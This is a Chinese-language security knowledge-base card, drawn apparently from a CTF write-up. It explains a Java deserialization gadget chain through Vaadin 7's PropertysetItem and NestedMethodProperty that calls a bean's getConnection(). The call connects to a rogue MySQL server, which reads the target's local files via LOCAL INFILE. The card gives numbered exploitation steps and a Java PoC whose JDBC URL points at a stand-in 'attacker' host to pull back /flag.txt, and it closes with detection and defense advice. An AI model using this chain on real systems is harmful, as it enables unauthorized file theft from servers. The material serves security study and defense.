---
id: web-java-deser-vaadin-nestedmethodproperty-getconnection-fake-mysql-file-read
title: Vaadin NestedMethodProperty 调业务 bean getConnection：反序列化触发可控 JDBC URL，用伪 MySQL 服务端 LOCAL INFILE 读取目标本地文件
type: scenario
domain: web
path: web/java/deserialization
technique: vaadin-any-getter-getconnection-fake-mysql-local-file-read
tags:
- java
- deserialization
- vaadin
- gadget-chain
- jdbc
- mysql
- local-infile
- file-read
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V512
  verified_at: '2026-11-11T11:28:00+08:00'
  notes: 已对照原文全文348行与全部28张图（图01-11 NestedMethodProperty/PropertysetItem 源码与断点、图12 TemplatesImpl 弹计算器、图14 pom vaadin-server/vaadin-shared 7.7.14、图25 MyBean.getConnection 拼接 database/host/username/password、图26 包名不一致 ClassNotFoundException、图27/28 伪MySQL读目录与 /flag.txt 回显）核对：BadAttributeValueExpException.readObject→PropertysetItem.toString→NestedMethodProperty.getValue→业务bean getConnection 触发链、URL 参数 user=fileread_file:///flag.txt&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=65536&allowUrlInLocalInfile=true# 及伪MySQL LOCAL INFILE 读文件均与原文/exp一致。dedup：与既有 Vaadin TemplatesImpl 卡、SQLContainer→JNDI 卡同为任意 getter 触发面但 sink 不同；与 h2 getConnection 卡相比触发 gadget（Vaadin vs BeanComparator/PriorityQueue）与 sink（伪MySQL读文件 vs H2 INIT RCE）均不同，非同一链，保留。affected_versions：7.7.14 仅为原文测试依赖，已确认未设置（--clear，字段为 null）。frontmatter 无 sources/source_url。未验证点：未复跑 Vaadin exp 与 MySQL_Fake_Server，flag 未在本库复现。
url: /docs/web/java/deserialization/web-java-deser-vaadin-nestedmethodproperty-getconnection-fake-mysql-file-read/
draft: false
kb_aliases:
- Vaadin getConnection 链
- 任意 getter 调 getConnection
- 反序列化触发 JDBC 连接
- 伪 MySQL 读文件
- fileread_file
---

## 一句话结论

当目标有 Java 原生反序列化入口、classpath 存在 Vaadin 7.x 与一个"无参 getter 内部用可控字段建立 JDBC 连接"的业务 bean（如 `getConnection()`）时，可用 `BadAttributeValueExpException.toString → PropertysetItem.toString → NestedMethodProperty.getValue` 触发该 getter，把攻击者设置的 `database`/URL 字段变成 JDBC 连接串，连向伪 MySQL 服务端并用 LOCAL INFILE 请求读回目标本地文件；在 `TemplatesImpl` 被反序列化黑名单封禁时，这条链不依赖 `TemplatesImpl` 也能完成利用。

## 原理

- **触发面**：`BadAttributeValueExpException.readObject`（JDK 原生反序列化经典 toString 触发器）会对 `val` 调 `toString()`；把 `val` 反射写为 `PropertysetItem` 后，其 `toString()` 遍历 `getItemPropertyIds()`，对每个 id 执行 `getItemProperty(id).getValue()`；`getItemProperty` 只是从内部 map 取值，而 `addItemProperty(id, property)` 允许在序列化前放入任意 `Property` 实现。
- **任意 getter 调用**：`NestedMethodProperty` 构造时按点分属性名解析并缓存 getter 方法链，`getValue()` 对 `instance` 逐个 `Method.invoke`。因此 `new NestedMethodProperty(myBean, "Connection")` 等价于调用 `myBean.getConnection()`——无参 getter 即可，无需与模板类相关。
- **sink 由业务 bean 决定**：业务代码里的 `getConnection()` 通常用内部 `database`/`url` 字段拼出 JDBC URL 再 `DriverManager.getConnection`。攻击者在序列化前反射设置该字段，即可把连接指向自己的服务器。JDBC URL 参数 `allowUrlInLocalInfile=true`/`ALLOWLOADLOCALINFILE=true`、`maxAllowedPacket` 等用于放开客户端本地文件读取。
- **为什么能读文件**：MySQL 协议的 `LOAD DATA LOCAL INFILE` 是"客户端读本地文件上传给服务端"；伪 MySQL 服务端无需等待 SQL，可在握手/查询响应时主动发 `0xFB + 文件路径` 请求包，客户端把目标服务器上的指定文件内容回传。伪服务端还支持 `fileread_file:///path` 形式的 user 参数直接指定要读的文件。
- **与 TemplatesImpl 链的关系**：同属"Vaadin 任意 getter 调用"触发面，但 sink 从 `TemplatesImpl.getOutputProperties()`（RCE）换成业务 bean 的 `getConnection()`（JDBC 文件读取/进一步利用）。只封 `TemplatesImpl` 的黑名单拦不住这条链，因为它根本不需要 `TemplatesImpl`。

## 触发条件

- 目标存在 Java 原生反序列化入口（`ObjectInputStream.readObject`、二次反序列化点等）。
- classpath 含 Vaadin 7.x（`vaadin-server`/`vaadin-shared`，原文测试 7.7.14）提供 `PropertysetItem`/`NestedMethodProperty`。
- 业务 classpath 中存在可控连接参数的 bean：无参 `getConnection()`/`getDataSource()` 等方法，且其 URL/用户名等字段可通过反序列化或反射赋值（CTF 中由题目 bean 提供，真实系统常见于数据源管理、报表、多租户配置类）。
- 目标可出网（或可路由）到攻击者控制的 MySQL 端口。

## 利用步骤

1. 审计目标 classpath 与业务代码，寻找"无参 getter + 内部用可控字段建 JDBC 连接"的类（如 `getConnection()`、`getDataSource()`）。
2. 构造该 bean，把连接字段设为 `mysql://attacker:3306/test?user=fileread_file:///flag.txt&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=65536&allowUrlInLocalInfile=true#`。
3. 用 `new NestedMethodProperty(bean, "Connection")` 生成会调用 `getConnection()` 的 Property。
4. 新建 `PropertysetItem`，`addItemProperty("Connection", nmprop)`。
5. 反射把 `BadAttributeValueExpException.val` 设为该 `PropertysetItem`，序列化。
6. 把序列化数据送入目标反序列化入口；目标反序列化时触发 `getConnection()` 连向伪 MySQL，服务端请求 LOCAL INFILE 并读取回传的文件内容。

## PoC

```java
MyBean myBean = new MyBean();
myBean.setDatabase("mysql://attacker:3306/test?user=fileread_file:///flag.txt"
    + "&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=65536&allowUrlInLocalInfile=true#");

PropertysetItem pItem = new PropertysetItem();
NestedMethodProperty<Object> nmprop = new NestedMethodProperty<>(myBean, "Connection");
pItem.addItemProperty("Connection", nmprop);

BadAttributeValueExpException ex = new BadAttributeValueExpException("x");
Field f = BadAttributeValueExpException.class.getDeclaredField("val");
f.setAccessible(true);
f.set(ex, pItem);
// 序列化 ex 并送入目标；伪 MySQL 服务端（MySQL_Fake_Server 一类）负责回传文件内容
```

原文在 CTF 中把上述序列化结果转为 HEX 后经 Fastjson 传入，目标 bean 包的包名需与目标一致才能通过反序列化类加载。

## 变体与关联

- 变体：把 `getConnection` 换成任何有副作用的无参 getter——`getDataSource`、`getInitialContext`、`getJdbcTemplate`、`getConnectionPool` 等，sink 随业务类而变。
- 变体：不出网时用 `fileread_file://` 之外的 MySQL 客户端本地文件读取方式（`LOAD DATA LOCAL INFILE` 指令）或 JDBC URL 其它协议参数。
- 关联：[[web-java-deser-vaadin-propertysetitem-nestedmethodproperty-templatesimpl]]（同触发面，sink 为 TemplatesImpl RCE）；[[web-java-deser-vaadin-sqlcontainer-tablequery-connectionpool-jndi]]（同触发面，sink 为 SQLContainer→JNDI）；[[web-java-deserialization-db-connection-test-page-jdbc-url-controlled]]（JDBC URL 直接可控的入口视角）；[[defense-incident-response-mysql-rogue-server-local-infile-client-file-read]]（伪 MySQL 服务端 LOCAL INFILE 的防御视角）。
- 限制：需要 classpath 中存在合适的副作用 getter 与可控连接字段；目标需能连到攻击者 MySQL；现代 MySQL 驱动 8.x 默认关闭 `allowLoadLocalInfile`/`allowUrlInLocalInfile`，需依赖 URL 参数或旧驱动。

## 检测与防御

- 反序列化侧：升级/移除 Vaadin 7，或在反序列化过滤器中对 `PropertysetItem`、`NestedMethodProperty`、`BadAttributeValueExpException` 统一拦截；对二次反序列化点做白名单。
- 代码侧：业务 bean 的 getter 不应产生网络/数据库副作用；连接参数必须来自服务端配置，不接受反序列化/请求赋值。
- 网络侧：限制应用服务器对任意 MySQL 端口的出站连接，监控 `LOAD DATA LOCAL INFILE` 与异常 JDBC 连接目标。
- 驱动侧：MySQL Connector/J 8.x 默认 `allowLoadLocalInfile=false`，如非必要不要开启 `allowUrlInLocalInfile`。
